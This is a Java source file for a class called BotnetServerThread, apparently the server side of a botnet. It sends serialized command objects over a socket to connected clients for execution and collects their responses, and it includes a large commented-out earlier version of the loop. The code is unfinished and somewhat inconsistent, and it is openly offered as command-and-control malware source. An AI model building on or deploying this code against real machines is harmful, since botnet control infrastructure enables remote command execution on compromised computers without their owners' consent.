import java.net.*;
import java.io.*;

/**
 * BotnetServer Class:
 * User facing object used to create and send command objects to client for execution
 */
public class BotnetServerThread extends Thread{
    // Properties
    private Socket socket;
    private CommandQueue queue;
    private Boolean status = true;

    //Constructor
    public BotnetServerThread(Socket socket){
        super();
        this.socket = socket;
    }


    public CommandQueue returnQueue(){
        return this.queue;
    }

    public void updateQueue(CommandQueue queue){
        this.queue = queue;
    }

    public boolean returnStatus(){
        return this.status;
    }
    
    // public void run() {
    //     try {
    //         //input and output streams for the buffer and socket
    //         ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
    //         ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
            
    //         //**WHILE YOU CAN READ objects FROM THE socket STREAM */
    //         // while (this.queue != null){
            
    //         while(true){
    //             out.writeObject(this.queue);
    //             out.flush();

    //             this.queue = (CommandQueue) in.readObject();

    //             // Command inCommand = this.queue.take();
    //             //Print the response of the command that was processed by the client
    //             // System.out.println("[+]Client: " + inCommand.getResponse());
    //             //*If the output is bye close connection */
    //             // if (inCommand.getResponse().equalsIgnoreCase("exiting")){
    //             //     System.out.println("[+]Closing connection");
    //             //     this.status = false;
    //             //     socket.close();
    //             //     in.close();
    //             //     out.close();
    //             //     System.exit(0);
    //             //     break;
    //             // }
    //             // out.writeObject(this.queue);

    //         }
            
    //         // }
    //         //*CLOSE CONNECTION IF YOU ARE DONE */
    //         // socket.close();
    //         // in.close();
    //         // out.close();

    //     //Error handle for if the class is not found or if there is an IO interuption
    //     } catch (ClassNotFoundException e){
    //         System.err.println("[-]IMClient Class not found");
    //         System.exit(1);
    //     }
    //     catch(SocketException e){
    //         System.err.println("[-]Client disconnected");
    //         // return null;
    //     }
    //      catch (IOException e) {
    //         e.printStackTrace();
    //     }
    //     // return this.queue;
    // }
    
    public void processQueue() {
        try (ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
             ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
            
            // while (true) {
            if(this.queue != null){
                // while(true){
                    try {
                        for(Command command = this.queue.take(); !command.isFinished(); command = this.queue.take()){
                            this.queue.status_of_queue();
                            out.writeObject(command);
                            // out.flush();
        
                            Command inCommand = (Command) in.readObject();
                            // System.out.println(inCommand.getResponse());
                            this.queue.put(inCommand);
                        }
                        // Command command = this.queue.take();
                        
                        // this.queue = (CommandQueue) in.readObject();
                    } catch (EOFException e) {
                        System.err.println("[-] Client closed the connection.");
                        // break;
                    }


                // }
            // }
            }
    
        } catch (ClassNotFoundException | IOException e) {
            e.printStackTrace();
        }
        
        }
    

    public void run(CommandQueue command) {
        while (status) {
            processQueue();
        }
    }

}